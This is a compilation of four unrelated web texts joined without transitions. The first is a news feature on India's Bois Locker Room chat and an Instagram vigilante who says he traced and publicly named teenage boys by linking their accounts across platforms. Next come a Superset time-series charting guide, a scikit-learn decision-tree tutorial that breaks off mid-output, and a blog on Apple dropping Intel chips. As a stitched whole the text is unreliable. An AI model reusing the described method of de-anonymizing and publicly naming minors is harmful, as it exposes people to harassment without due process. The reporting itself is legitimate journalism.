<p>One of the alleged victims of the group, which became known as the Bois Locker Room chat, was Madhuri, a 17-year-old girl in Bangalore who asked to be identified by a pseudonym. She told <em>Rest of World</em> that, in April, she received an unsolicited message from one of the boys requesting nude photographs. “I refused, but he kept on insisting,” she said. She showed <em>Rest of World</em> a screenshot of his response: “You motherfucker. Send me pictures of your breasts. How dare you say no to me?” The boy then superimposed Madhuri’s face onto a pornographic picture and sent it to her. She blocked him. But a month later, she realized he also shared the picture on the Bois Locker Room chat. She soon learned she<strong> </strong>was not the only one. The group had targeted multiple underage girls with photo manipulation. “It was disgusting,” she said. “One boy replied that he preferred bigger breasts. Another said he’d like to rape me.” What Madhuri didn’t do is go to the police. “They don’t take [sexual-harassment cases] very seriously,” Madhuri told me. “Besides, my parents would have felt bad about me going public. You know what it’s like for girls. We’d be blamed first.”&nbsp;</p>



<p>Yet Madhuri and the other victims would soon attain some measure of justice via unconventional means. She sent the screenshots to <a href="https://www.instagram.com/shubhamcybercop/">@shubhamsinghcybercop</a>, an Instagram user who had quietly begun investigating the case.<strong> </strong>After recording her statement, he asked if she wished to submit a legal complaint; she declined. </p>



<p>The operator of the account is Shubham Singh, a 25-year-old wunderkind digital detective of sorts in Mumbai, some 1,400 kilometers away. He regards himself as a private investigator, gathering information to verify claims of online harassment and encouraging victims to pursue legal action. His vigilantism — what he calls “ethical hacking” — resides somewhere on the spectrum between the formal justice of the courts and the informal justice of the social-media tribunal. Despite his unorthodox methods, he has quickly become one of India’s most popular cybercrime&nbsp;experts, assisting Mumbai’s police in cases ranging from petty fraud to kidnapping, and even occasionally lending a hand to anti-terrorism efforts.</p>



<p>Several weeks after Madhuri’s exchange with the boy, screenshots from the Bois Locker Room were leaked onto <a href="https://www.indiatoday.in/india/story/bois-locker-room-delhi-schoolboys-create-group-to-share-lewd-photos-chats-on-classmates-1674303-2020-05-04">social media</a> after <a href="https://www.instagram.com/ashnaaasharmaa/">@ashnaaasharmaa</a>, an Instagram influencer, <a href="https://www.instagram.com/stories/highlights/17890085584516759/">shared</a> a list of the boys’ handles and requested that her followers expose “[t]hese cunts.” The story revealed that most of the boys attended several prominent private schools in Saket, an affluent South Delhi suburb. The details were shocking: In the chat — which included roughly 30 boys, some as young as 15 — the boys rated the attractiveness of underage girls’ bodies and exchanged their personal information. Some even shared lewd tales of alleged<strong> </strong>sexual encounters with the girls. National media outlets <a href="https://qz.com/india/1850737/delhi-boyslockerroom-chat-puts-spotlight-on-india-rape-culture/">swarmed</a> over the story, as Indian social media erupted in outrage. As <a href="https://pbs.twimg.com/media/EXKrLUnUEAE3SAs.jpg">more screenshots</a> from the chat emerged, the group members threatened to rape or leak nude photographs of the whistleblowers. One said: “I am going to Fuck every single [girl] who posted on their story” — a threat newspapers interpreted as rape.&nbsp;</p>

<p>But the Bois’ plans for revenge would be foiled, thanks in part to Singh. Over a Skype <em>chai</em> in late May,<strong> </strong>he told <em>Rest of World</em> that an influencer had tipped him off about the case by tagging him in an Instagram story and asking for his assistance in finding the boys. He said that soon after the story appeared, his inbox was flooded with screenshots from alleged victims. “On an average day, I get 10 to 20 messages,” he said, “but this time, I must have gotten over 200.” He had only a few blurred screenshots from the Bois’ chat that had gone viral — fearing public retaliation, members had deleted their Instagram accounts, seemingly eliminating any evidence. How, then, did he track them down? “Us ethical hackers, we have our techniques,” he grinned.&nbsp;</p>



<p>Singh explained that he first asked the girls who had approached him to send him screen recordings to confirm their stories. Next, he used a special tracking software to find their email addresses via their Instagram handles. After confirming those addresses, he searched Facebook for accounts registered under those emails and compared their Instagram pictures to those<strong> </strong>posted to<strong> </strong>their Facebook accounts.<strong> </strong>Once he confirmed the identities of the nine boys who were active participants in the leaked chats, Singh forwarded a WhatsApp message containing his findings<strong> </strong>to a police officer in New Delhi. He received no response. So he tracked down the boys’ parents and called them. “Since they were minors,” he said, “I wouldn’t speak to them directly. But their parents needed to know what their children were up to. I recommended that the boys seek counseling.”&nbsp;</p>



<p>Singh then shared the names of the nine boys on his own Instagram account. Their handles were also posted publicly by “<a href="https://www.instagram.com/wallofshamereal/?hl=en">Wall of Shame Real</a>,” an anonymous Instagram page that names and shames alleged sexual offenders. Its administrator invited the page’s 35,000-plus followers to bring forward more screenshots and stories of harassment that could be used as evidence against the boys. “Their parents have been informed. Now, for the real action, you need to step up and help sir [Singh] in the case,” the post read. (The administrator of the Wall of Shame Real page did not return<em> Rest of World</em>’s request for comment.)&nbsp;</p>

<p>On May 6, the <a href="https://www.hindustantimes.com/delhi-news/admin-of-instagram-group-bois-locker-room-arrested-devices-seized/story-9tQDaF32QglX2tnyGPP6wI.html"><em>Hindustan Times</em> reported</a> that the Delhi police had apprehended an administrator of the group chat — the result of a social media furor fomented, in large part, by Singh. With their elite private-school pedigrees and social-media savvy, these boys seemed to alert India to a generation of young people doing whatever they wanted to whomever they chose to — as much online as elsewhere in the world. It is still unclear what the consequences will be for the boys of Bois Locker Room, though many have been questioned by the police in recent weeks.</p>



<p>Singh’s decision to share the boys’ Instagram handles, some of which revealed their full names, seemed to skirt an ethical line. But he insisted that their handles had already been shared publicly before his involvement in the matter. “I don’t believe in trial by social media. Instagram is not a courtroom. I always verify my claims before I post them,” he said. At the same time, he acknowledged: “Sometimes, to get justice, you need to do unethical things.”</p>



<p>The Bois Locker Room<strong> </strong>case struck a chord with Indians still convulsed with anger over the treatment of women in their country. In 2012, a fatal gang rape on a bus in Delhi enraged the country and spurred legal and judicial reforms. Yet the horror remains. According to the <a href="https://www.reuters.com/article/us-india-rape-factbox/statistics-on-rape-in-india-and-some-well-known-cases-idUSKBN1YA0UV">latest statistics</a>, every day, 90 rapes are reported in India, but many more go unreported, due to fears and stigma.&nbsp;In the first three and a half months of 2018, more than five women were raped every day in the capital city. In February, a man <a href="https://www.bbc.co.uk/news/world-asia-india-51398295">allegedly raped a 5-year-old girl</a> within the grounds of the U.S. Embassy in Delhi.&nbsp;</p>



<p>Critics argue that the government has failed to address the heart of the problem: cultural notions of purity that lead third parties, particularly law enforcement, to blame the victim. A longtime police inspector with the<strong> </strong>Mumbai Crime Branch, who spoke to <em>Rest of World</em> on condition of anonymity, said that victims of sex crimes directly approach private investigators such as Singh out of convenience, not frustration. “If you lodge a claim, you will have to be questioned, have a character certificate taken … these things take a few days. People think going to the police is a waste of time — if I advertised free private help on Facebook, why wouldn’t people come to me? It’s just easier.”&nbsp;</p>



<p>The inspector disagreed that police fail to adequately protect sexual-harassment victims. “There may have been cases where officers behaved badly, but the government has now made lots of changes to help girls feel more comfortable approaching the police,” he said. “There are dedicated lady officers and help lines for sexual-harassment cases.”&nbsp;</p>



<p>The numbers would appear to back him up: Between 2012 and 2015, cases of rape reported to the police increased by 39%, perhaps suggesting victims have become more willing to come forward. But victims still claim law enforcement dissuades them from pressing charges. They often suffer humiliation at police stations and hospitals, according to a 2017 <a href="https://www.hrw.org/report/2017/11/08/everyone-blames-me/barriers-justice-and-support-services-sexual-assault-survivors">paper</a> by Human Rights Watch. Even when police do cooperate with victims, the legal system often fails them. According to 2018 data from India’s National Crime Records Bureau, only <a href="https://economictimes.indiatimes.com/news/politics-and-nation/conviction-in-crimes-against-dalits-is-abysmally-low-mha-report/articleshow/63833473.cms">27.2%</a>&nbsp;of state prosecutions for rape in India led to a conviction. By contrast, the <a href="https://www.cps.gov.uk/cps/news/annual-violence-against-women-and-girls-report-published-0">corresponding figure</a> for 2017 to 2018 in the United Kingdom stood at 58%.&nbsp;</p>



<p>Rukmini Sen, a sociologist with the Ambedkar University Delhi, said India’s male-dominated police force still stigmatizes victims of sexual violence. “Time and again, various initiatives are announced … and clearly all of these attempts have either not been properly carried forward or have not created enough confidence in women,” she said.&nbsp;</p>

<p>In the <a href="https://preset.io/blog/2020-06-08-first-chart/">previous blog post</a>, we learned how to start to create charts in <a href="https://superset.incubator.apache.org/">Superset</a> and specifically <a href="https://preset.io/blog/2020-06-08-first-chart/">how to create a composition charts</a> to understand understand how data is formed. This, in turn, can be used to determine which chart type is the most appropriate.</p>
<p>In this blog article we will explore the topic of time series data, visualization options, and how to best represent time series data in order to facilitate trend analysis. Data used in the examples below is available in a <a href="https://raw.githubusercontent.com/eugeniamz/ce_test_db/master/Covid19_CasesTS_data.csv">GitHub repository</a> — you can also <a href="https://www.youtube.com/watch?v=r4sjmAKaJ6M&amp;t=3s">view instructions</a> on how to import the file into your own database.</p>
<h2 id="why-time-series-charts"><a href="#why-time-series-charts" aria-label="why time series charts permalink"></a>Why Time Series Charts</h2>
<p>Time series data is important because it is used to understand and analyze data behavior over time. Using historical data, time series charts enable companies to spot trends, changes in behavior, and compare different metrics to visualize correlations. Examples of time series analysis includes website visits, sales trends, and IoT (Internet of Things) data.</p>
<p>In a time series chart, you represent a independent variable (time) vs. dependent variables (metrics) to analyze behavior over time.</p>
<p>In the example of Covid-19 data, a time series chart will enable you to answer critical questions, such as:</p>
<ul>
<li>Are the number of Confirmed Cases decreasing? (trend)</li>
<li>Did we flatten the curve? (trends)</li>
<li>Is there a correlation between confirmed cases and deaths?</li>
</ul>
<h2 id="times-series-analysis-with-superset"><a href="#times-series-analysis-with-superset" aria-label="times series analysis with superset permalink"></a>Times Series Analysis with Superset</h2>
<p>Superset has a rich library of time series graphs for different use cases, such as: Line Charts, Area Charts, Time Series Bar Charts, Dual Line Charts, Calendar Heat Maps, Horizon Charts, and more. In this article, we will show examples of some of these charts and how changing a visualization type can dramatically change how data is displayed for trend analysis.</p>

<p><strong>Time Field:</strong> This is a independent variable and is represented on the X-axis. Options in the Time Column drop-down are fields that have the option temporal in the Columns field within the data source. The Time Grain drop-down indicates the data aggregated label used when displaying the metrics.</p>
<p><strong>Metrics:</strong> This is a required field and represents the dependent variables that will be displayed on the Y-axis.</p>
<p>All the other fields are optional, but it is important to keep in mind that an efficient chart is a simple chart — therefore, be sure to reduce the use of filters, granularity, and limit the series represented in the Group By and Series limit fields. By default, the Series limit field uses the first metric value to cut off values but, alternatively, the Sort By field allows you to filter data with an additional data point.</p>
<h2 id="time-series-bar-chart"><a href="#time-series-bar-chart" aria-label="time series bar chart permalink"></a>Time Series Bar Chart</h2>
<p>Time series bar charts represent categories by vertical charts.</p>

<p>In this example, you can see that the numbers of dates (last 3 months ~90 bars) are too wide to be represented on the screen — this is a good opportunity to reduce the date granularity in order to reduce the data points on the X-axis.</p>

<p>However, adding too many series (e.g., many distinct values in the Group By field) could make it difficult to understand and conceptualize the series. In this case, it is useful to use Series Limit to reduce the number of series.</p>

<h2 id="area-chart"><a href="#area-chart" aria-label="area chart permalink"></a>Area Chart</h2>
<p>Area chart are similar to line chart in that they represent variables with the same scale, but area charts stack the metrics on top of each other. An area chart in Superset can be stream, stack, or expand.</p>
<p>By simply changing the Visualization Type, we can display the line chart above as an area chart</p>

<p>Sometimes when looking at data points on a per day basis, it is difficult to determine trends and data variance. For example, the chart below shows the top American states with new Covid-19 cases on a per day basis (taken over the last month). This view makes it difficult to discern a clear trend.</p>

<p>In order to gain a greater insight into this data, we recommend smoothing out the short-term fluctuations between data points by applying a moving average. The moving average—available in the <em>Advance Analytics function</em>—applies the average between defined X periods instead of marking actual data points by date.</p>
<p>If we apply this technique to the previous chart by using the moving average over the last 7 days, the lines in the chart will be smoothed out and facilitate the recognition of trends.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
			<p>In this post we are going to see how to build a basic decision tree classifier using scikit-learn package and how to use it for doing multi-class classification on a dataset.</p>

<p>Decision trees is an efficient and non-parametric method that can be applied either to classification or to regression tasks.</p>

<p>To predict the dependent variable the input space is split into local regions because they are hierarchical data structures for supervised learning</p>

<p>Decision tree is a simple to learn and easy to interpret and Visualize the decisions in a tree format. It has the advantage of producing comprehensible classification/regression model with satisfactory accuracy level.</p>

<p>We will be exploring the DecisionTreeClassifier function of sklearn and all the parameters of it. You will also see how to Visualize the decision tree Rules and the Boundaries that model is creating to classify the different Classes(targets)</p>

<h2 id="decision-tree-classifier-in-sklearn"><strong>Decision Tree Classifier in Sklearn</strong></h2>

<div><div><pre><code>sklearn.tree.DecisionTreeClassifier(_criterion='gini'_,&nbsp;_splitter='best'_,&nbsp;_max_depth=None_,
&nbsp;
_min_samples_split=2_,&nbsp;_min_samples_leaf=1_,&nbsp;_min_weight_fraction_leaf=0.0_,&nbsp;_max_features=None_,&nbsp;

_random_state=None_,&nbsp;_max_leaf_nodes=None_,&nbsp;_min_impurity_decrease=0.0_,&nbsp;_min_impurity_split=None_,&nbsp;

_class_weight=None_,&nbsp;&nbsp;_ccp_alpha=0.0_)
</code></pre></div></div>

<h2 id="parameters"><strong>Parameters</strong></h2>

<h3 id="criterion"><strong>criterion</strong></h3>

<p>Gini or entropy and default is Gini.</p>

<p>One of the Critical factor is to choose which feature for splitting the nodes in subsets and for making that decision we choose out of these two criteria</p>

<ul>
  <li>Information Theory (Entropy)</li>
  <li>Distance Based (Gini)</li>
</ul>

<p>Both are impurity measures and it looks like the selection of impurity measure has little effect on the performance of single decision tree algorithms</p>

<p>The impurity is measured before and after splitting a node according to each possible attribute.</p>

<p>The attribute which presents the greater gain in purity, i.e., that maximizes the difference of impurity taken before and after splitting the node, is chosen</p>

<p>Entropy might be a little slower to compute because it makes use of the logarithm</p>

<h3 id="splitter"><strong>Splitter</strong></h3>

<p>Strategy to choose out of best or random. Default is best</p>

<p>If the best strategy is chosen then it will split on the most important feature first</p>

<p>it will choose a feature on random for splitting the node if splitter set to random which could lead to accuracy and more depth in the decision tree</p>

<h3 id="max_depth"><strong>max_depth</strong></h3>

<p>The maximum depth of the tree.</p>

<p>One of the stopping criteria that let you decide when to terminate the tree building process. A tree can be grown until a maximum depth is reached.</p>

<p>A tree can be grown to a maximum depth of N-1 where N is the number of samples</p>

<p>Beside max_depth there are other stopping criteria as well so in reality a tree will never go a maximum depth of N-1</p>

<p>Mostly we try to pick the optimal depth based on cross-validation and decides the reasonable max_depth value</p>

<h3 id="min_samples_split"><strong>min_samples_split</strong></h3>

<p>The minimum number of samples required at an Internal node for splitting. Say for example min_samples_split = 5 and there are 8 samples at a decision node then the split is allowed otherwise if &lt;5 then not allowed.</p>

<p>if <strong>min_sample_leaf</strong> = 2 and one leaf has 1 sample and other has 6 samples then the split is not allowed</p>

<p>so min_samples_split depends on the min-sample_leaf defined as well</p>

<p><img src="https://kanoki.org/images/2020/05/image-6.png" alt=""></p>

<h3 id="min_samples_leaf"><strong>min_samples_leaf</strong></h3>

<p>The minimum number of samples required at a leaf node</p>

<h3 id="min_weight_fraction_leaf"><strong>min_weight_fraction_leaf</strong></h3>

<p>The minimum weighted fraction</p>

<div><div><pre><code>`fit`(_self_,&nbsp;_X_,&nbsp;_y_,&nbsp;_sample_weight=None_,&nbsp;_check_input=True_,&nbsp;_X_idx_sorted=None_)
</code></pre></div></div>

<p>this parameter decides the required fraction of samples (or weights) in each leaf node</p>

<p>It uses the weight defined for each sample thru the fit method that has a <strong>sample_weight</strong> which lets you specify the weight of each of the samples and accepts values in an array like format for n_samples</p>

<p>if a minimum weight fraction is set and the sample weight is None then it will assume a uniform weight for all the samples</p>

<h3 id="max_features"><strong>max_features</strong></h3>

<p>It defines the number of features to be used for best split.</p>

<p>It is used to control the over-fitting. For example if the shape of your data is 30 and max_feature is set to 5.</p>

<p>So Every time at a decision node you will choose maximum of 5 features that are selected randomly for splitting</p>

<h3 id="random_state"><strong>random_state</strong></h3>

<p>It is the seed used by the random number generator. it is basically used to make the result or outcome of the classifier consistent.</p>

<p>It hardly matters what number you select but if you select the same number each time then the output remains deterministic</p>

<h3 id="max_leaf_node"><strong>max_leaf_node</strong></h3>

<p>maximum leaf node. It is one of the stopping criteria to grow a tree wih max_leaf_node.</p>

<p>By default it is set to None which means it will grow to unlimited leaf nodes and other stopping criteria will be considered</p>

<p>from the official <a href="https://scikit-learn.org/stable/modules/generated/sklearn.tree.DecisionTreeClassifier.html">documentation</a> the formula for weighted impurity decrease is as follows:</p>

<div><div><pre><code>N_t / N * (impurity - N_t_R / N_t * right_impurity
                    - N_t_L / N_t * left_impurity)
</code></pre></div></div>

<p>This formula takes into account how much the parent node makes up of the total tree (N_t / N) and the weighted impurity decrease from the child nodes.</p>

<p>If the final impurity decrease is less than the minimum impurity decrease parameter, then the split will not be performed</p>

<h3 id="class_weight"><strong>class_weight</strong></h3>

<p>By default all the classes have same weight i.e. 1</p>

<p>The class_weight parameter deals well with unbalanced classes by giving
more weight to the under represented classes.</p>

<p>It is used for re-weighting the splitting criterion</p>

<p>Higher the class_weight more you want to put emphasis on that class.</p>

<p>For multi-output, class_weights will be multiplied with <strong>sample_weight</strong> (passed through the fit method) if <strong>sample_weight</strong> is specified</p>

<h2 id="get-started"><strong>Get Started</strong></h2>

<p>We will use the wine dataset from sklearn.</p>

<p>Let’s load the data and then will split into train and test sets</p>

<div><div><pre><code>from sklearn import datasets
from sklearn.tree import DecisionTreeClassifier
wine_data = datasets.load_wine()
</code></pre></div></div>

<p>Let’s check out the important keys in this dataset</p>



<div><div><pre><code>dict_keys(['data', 'target', 'target_names', 'DESCR', 'feature_names'])
</code></pre></div></div>

<p>So we have data, target variables with their names stored in target_names and feature names</p>

<p>Let’s find out the features in the data that we will use to train the decision tree classifier</p>



<div><div><pre><code>['alcohol',
 'malic_acid',
 'ash',
 'alcalinity_of_ash',
 'magnesium',
 'total_phenols',
 'flavanoids',
 'nonflavanoid_phenols',
 'proanthocyanins',
 'color_intensity',
 'hue',
 'od280/od315_of_diluted_wines',
 'proline']
</code></pre></div></div>

<p>Here are the different classes or targets in which each of these data is classified to i.e. class_0, class_1 and class_2</p>



<div><div><pre><code>**array(['class_0', 'class_1', 'class_2'], dtype='&lt;U7')**
</code></pre></div></div>

<p>Finally lets check the data by importing it into a Dataframe object. So you can visualize how the data looks like</p>

<div><div><pre><code>import pandas as pd
pd.DataFrame(wine_data.data,columns=wine_data.feature_names)
</code></pre></div></div>

<p>We can see there are 178 rows and 13 features in this dataset.</p>

<p><img src="https://kanoki.org/images/2020/05/image-7.png" alt=""></p>

<h2 id="train-test-split"><strong>Train Test Split</strong></h2>

<p>We have split the data into training and test set using sklearn train_test_split</p>

<div><div><pre><code>from sklearn.model_selection import train_test_split
X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=0.3,
stratify=y)
</code></pre></div></div>

<h2 id="accuracy-score-and-cross-validation"><strong>Accuracy Score and Cross Validation</strong></h2>

<p>Lets measure the testing accuracy using sklearn accuracy_score.</p>

<p>For that we are going to instantiate the Decision tree classifier and then use the fit method on Train data.</p>

<p>Predict method of decision tree classifier will find the target class for the test data</p>

<p>Finally we will calculate the accuracy on our test data prediction</p>

<div><div><pre><code>from sklearn.metrics import accuracy_score

clf = DecisionTreeClassifier() #Instantiate Decision tree classifier
clf.fit(X_train, y_train)      # Use fit method on the train data

y_pred = clf.predict(X_test)   # Predict the target class of test data
accuracy_score(y_test, y_pred)  # Measure Accuracy
</code></pre></div></div>

<p>Let’s evaluate the cross validation score as well</p>

<div><div><pre><code>from sklearn.model_selection import cross_val_score
scores = cross_val_score(clf, X_test, y_test, cv=5)
print("Accuracy: %0.2f (+/- %0.2f)" % (scores.mean(), scores.std() * 2))
</code></pre></div></div>

<h2 id="visualize-decision-tree-using-plot_tree"><strong>Visualize Decision Tree using plot_tree</strong></h2>

<p>You can also Visualize the final decision tree by using the plot_tree function of the sklearn.</p>

<p>There are other ways to visualize using pydot and graphviz but I’m not going to discuss those methods in this post</p>

<div><div><pre><code>%matplotlib inline
from matplotlib.pyplot import figure
from sklearn.tree import plot_tree
figure(num=None, figsize=(20, 6), dpi=80, facecolor='w', edgecolor='k')
plot_tree(clf.fit(wine_data.data, wine_data.target))
</code></pre></div></div>

<p><img src="https://kanoki.org/images/2020/05/image.png" alt=""></p>

<h2 id="gridsearchcv"><strong>GridSearchCV</strong></h2>

<p>Hyper parameters selection is an important part for model selection. how would you know what combinations of these parameters will give you the best outcome?</p>

<p>One way is randomly selecting these values and see which combinations of parameters will give best result.</p>

<p>Isn’t that tedious to do? So Grid Search in Scikit-learn exactly does the same thing and helps to find the best estimator</p>

<div><div><pre><code>from sklearn.model_selection import GridSearchCV, cross_val_score
param_grid = {'criterion':['gini','entropy'], 'max_depth' :
[3,5,7,20]}
grid_search = GridSearchCV(clf,param_grid=param_grid,cv=5)
grid_search.fit(X_train, y_train)
</code></pre></div></div>

<p><img src="https://kanoki.org/images/2020/05/image-1.png" alt=""></p>

<p>You can see all the criteria and their respective score that gridsearch used to evaluate the best estimate by accessing the params and mean_test_score of grid search object</p>

<p>The params and the mean_test_score keys will give you the parameters and their corresponding results</p>

<div><div><pre><code>grid_search.cv_results_['params']
grid_search.cv_results_['mean_test_score']
</code></pre></div></div>

<div><div><pre><code>([{'criterion': 'gini', 'max_depth': 3},
  {'criterion': 'gini', 'max_depth': 5},
  {'criterion': 'gini', 'max_depth': 7},
  {'criterion': 'gini', 'max_depth': 20},
  {'criterion': 'entropy', 'max_depth': 3},

			<p><a href="#"><img alt="Of WWDC, Intel, and some ramblings about what this might mean" src="https://www.quintersol.com/wp-content/uploads/2020/06/IntelApple.jpeg"></a></p><!-- .entry-header --><p>So <a href="https://developer.apple.com/wwdc20/">WWDC 2020</a> – Apple’s Worldwide Developers Conference happened last week, between the 22nd and 26th of June. Despite being the first-ever virtual-only WWDC due to the Covid-19 pandemic, a lot happened:</p>
<ul>
<li>iOS 14 is now available in beta for developers,</li>
<li>we now have Scribble to help us to literally ‘scribble’ on our iOS devices,</li>
<li>we can arrange our widgets on the home screen,</li>
<li>get cycling directions (EV Routing),</li>
<li>and have Digital Car Keys.</li>
</ul>
<div id="attachment_3970"><p><img aria-describedby="caption-attachment-3970" src="https://www.quintersol.com/wp-content/uploads/2020/06/iOS14.jpeg" alt="WWDC2020, iOS14" width="680" height="383" srcset="https://www.quintersol.com/wp-content/uploads/2020/06/iOS14.jpeg 680w, https://www.quintersol.com/wp-content/uploads/2020/06/iOS14-300x169.jpeg 300w, https://www.quintersol.com/wp-content/uploads/2020/06/iOS14-600x338.jpeg 600w" sizes="(max-width: 680px) 100vw, 680px"></p><p id="caption-attachment-3970">WWDC2020, iOS14</p></div>
<p>All these announcements and more were by all means exciting, including the all amazing Big Sur to customize our Memoji on our Macs. <a href="https://www.youtube.com/watch?v=4An0ndagZsQ">Watch here</a> in case you missed #WWDC2020 and want to catch a glimpse.</p>
<p>However, the most shocking announcement, which we really are all talking about is the <a href="https://www.nytimes.com/2020/06/22/technology/apple-macs-intel-chips.html">Big Break up between Apple and Intel</a>. Well, it doesn’t entirely come as a shocker, as <a href="https://www.cnbc.com/2020/06/09/apple-reportedly-to-switch-from-intel-processors-in-macs.html">Steve Jobs had implied it. But that was 15 years ago.</a></p>
<p>So, today, we take you with us down this rabbit hole, with a little snooping around, since after all, Apple’s and Intel’s is our business too, so it’s kind of okay if we put our nose in it.</p>
<h2>The reception of the news</h2>
<p>We did a little snooping as we went down this rabbit hole just to get ‘the sentiments’. There were people who as usual turned to our de facto way of communicating these days: memes.</p>
<div id="attachment_3972"><p><img aria-describedby="caption-attachment-3972" src="https://www.quintersol.com/wp-content/uploads/2020/06/Zillicon.png" alt="Apple Ditches Intel" width="1366" height="768" srcset="https://www.quintersol.com/wp-content/uploads/2020/06/Zillicon.png 1366w, https://www.quintersol.com/wp-content/uploads/2020/06/Zillicon-300x169.png 300w, https://www.quintersol.com/wp-content/uploads/2020/06/Zillicon-1024x576.png 1024w, https://www.quintersol.com/wp-content/uploads/2020/06/Zillicon-768x432.png 768w, https://www.quintersol.com/wp-content/uploads/2020/06/Zillicon-600x337.png 600w" sizes="(max-width: 1366px) 100vw, 1366px"></p><p id="caption-attachment-3972">Apple Ditches Intel</p></div>
<p>And like many of us, we began to wonder why. Could it be that Apple wants to ‘pack some more power’ into their batteries?</p>

<div id="attachment_3975"><p><img aria-describedby="caption-attachment-3975" src="https://www.quintersol.com/wp-content/uploads/2020/06/Plat40m-1.png" alt="Intel Battery Power" width="559" height="681" srcset="https://www.quintersol.com/wp-content/uploads/2020/06/Plat40m-1.png 559w, https://www.quintersol.com/wp-content/uploads/2020/06/Plat40m-1-246x300.png 246w" sizes="(max-width: 559px) 100vw, 559px"></p><p id="caption-attachment-3975">Intel Battery Power</p></div>
<h2>What caused the breakup?</h2>
<p>Since we are curious human beings with a little detective muscle in us that we like to exercise a bit (we don’t want to suffer from atrophy), we sought to get to the bottom of this turn of events.</p>
<p>Better still, on a more serious note, because we are techies, we need to understand what implications this has in the industry as a whole. We code in Swift, by the way.</p>
<p>And thirdly, even more seriously, we are a business and no one just leaves their 15-year long partnership without a good reason.</p>
<h3>Conspiracy theories</h3>
<p>There are a lot of conspiracy theories going around since Apple did not officially state the reason for the breakup.</p>
<h3>Conspiracy theory #1</h3>
<p>Like we have mentioned, Steve Jobs had implied that the break up would be inevitable. He said that Intel would be pivotal in helping Apple build powerful computers for the ‘next decade’. He did not say whether the processors would still be relevant after that, which implied that there was a likely breakup.</p>
<h3>Conspiracy theory #2</h3>
<div id="attachment_3976"><p><a href="https://www.researchgate.net/figure/Skylake-CPU-and-Arria-10-FPGA-from-Intel-Intel-Hybrid-chips-that-combine-FPGAs-with_fig1_329894874"><img aria-describedby="caption-attachment-3976" src="https://www.quintersol.com/wp-content/uploads/2020/06/skylake.jpg" alt="Intel-Apple Skylake" width="283" height="286" srcset="https://www.quintersol.com/wp-content/uploads/2020/06/skylake.jpg 283w, https://www.quintersol.com/wp-content/uploads/2020/06/skylake-100x100.jpg 100w" sizes="(max-width: 283px) 100vw, 283px"></a></p><p id="caption-attachment-3976">Intel-Apple Skylake</p></div>
<p>According to <a href="https://youtu.be/JImi0Vnjvfw">François Piednoël, Former Intel Corp Performance Guru</a> Skylack’s line of processors’ Quality Assurance was ‘bad’. In his words, “Our buddies at Apple became the number one filers of problems in the Architecture”.</p>
<p>The numerous bugs on Skylack were the straw stroke that broke the camel’s back, for an Apple that was already contemplating on moving on from their processor partner, Intel. François also cited internal wrangles within Intel.</p>
<h2>What does this all mean?</h2>
<p>So as we try to process this new shocker, this news means several things. Let’s explore them below:</p>
<h3>#1 Apple definitely has more control</h3>
<p>Apple will be able to consolidate its devices and software to run seamlessly and cross-platform. iOS and iPadOS apps will be able to run on Mac, for example. The company will also be able to make higher quality products with higher processing speeds and that can do the ‘heavy lifting’, for example, gaming.</p>
<h3>#2 Apple users might want to wait for the new ARM/silicon-based Macs</h3>
<p>A survey by @tiborbodecs on Twitter showed that users might want to take this route:</p>
<div id="attachment_3977"><p><img aria-describedby="caption-attachment-3977" src="https://www.quintersol.com/wp-content/uploads/2020/06/ScreenshotwithAttribution-e1593416799503.jpeg" alt="Apple ARM-based Macs" width="947" height="1950" srcset="https://www.quintersol.com/wp-content/uploads/2020/06/ScreenshotwithAttribution-e1593416799503.jpeg 947w, https://www.quintersol.com/wp-content/uploads/2020/06/ScreenshotwithAttribution-e1593416799503-146x300.jpeg 146w, https://www.quintersol.com/wp-content/uploads/2020/06/ScreenshotwithAttribution-e1593416799503-497x1024.jpeg 497w, https://www.quintersol.com/wp-content/uploads/2020/06/ScreenshotwithAttribution-e1593416799503-768x1581.jpeg 768w, https://www.quintersol.com/wp-content/uploads/2020/06/ScreenshotwithAttribution-e1593416799503-746x1536.jpeg 746w, https://www.quintersol.com/wp-content/uploads/2020/06/ScreenshotwithAttribution-e1593416799503-600x1235.jpeg 600w" sizes="(max-width: 947px) 100vw, 947px"></p><p id="caption-attachment-3977">Apple ARM-based Macs</p></div>
<p>Since the transition will take two years, Intel-based products still in the pipeline will still be released. The only problem could be that users may not want to buy them.</p>
<h3>#3 Old Intel-based apps will continue to work on the new ARM-based Macs</h3>
<p>Apple had already laid the groundwork with <a href="https://www.apple.com/rosetta/index.html">Rossetta 2</a>, an emulator that is able to compile code written to run on Intel architecture to run on ARM. The company will also continue to support Intel-based Macs. So, don’t ditch your Mac yet.</p>
<p>Intel-based apps will run slower on the new Macs, though, as Rossetta will need time to translate the code.</p>
<h3>#4 Developers need to upskill to build apps that can run on the new ARM-based Macs</h3>
<p>Rossetta is only a temporary solution. For developers, you are better off getting the <a href="https://developer.apple.com/programs/universal/">Developer Transition Kit </a>to prepare yourself to start building native apps to run on the new ARM-based Macs, come 2021.</p>
<div id="attachment_3978"><p><a href="https://developer.apple.com/programs/universal/"><img aria-describedby="caption-attachment-3978" src="https://www.quintersol.com/wp-content/uploads/2020/06/Screenshot-from-2020-06-29-09-24-09.png" alt="Apple Developer Transition Kit" width="1366" height="768" srcset="https://www.quintersol.com/wp-content/uploads/2020/06/Screenshot-from-2020-06-29-09-24-09.png 1366w, https://www.quintersol.com/wp-content/uploads/2020/06/Screenshot-from-2020-06-29-09-24-09-300x169.png 300w, https://www.quintersol.com/wp-content/uploads/2020/06/Screenshot-from-2020-06-29-09-24-09-1024x576.png 1024w, https://www.quintersol.com/wp-content/uploads/2020/06/Screenshot-from-2020-06-29-09-24-09-768x432.png 768w, https://www.quintersol.com/wp-content/uploads/2020/06/Screenshot-from-2020-06-29-09-24-09-600x337.png 600w" sizes="(max-width: 1366px) 100vw, 1366px"></a></p><p id="caption-attachment-3978">Apple Developer Transition Kit</p></div>
<h3>#5 Big Tech Companies might follow suit</h3>
<p>To an extent, Apple’s move from Intel’s x86’s processors is a benchmark. If the transition is successful, then other companies are likely to follow suit. In an interview with <a href="https://fortune.com/2020/06/09/apple-intel-arm-chip-shift-mac/">Fortune Magazine</a>, HP and Acer said they had laptop models powered by ARM-based chips. Samsung and Lenovo do have ARM-based laptops too.</p>
<h2>When should we expect new Macs?</h2>
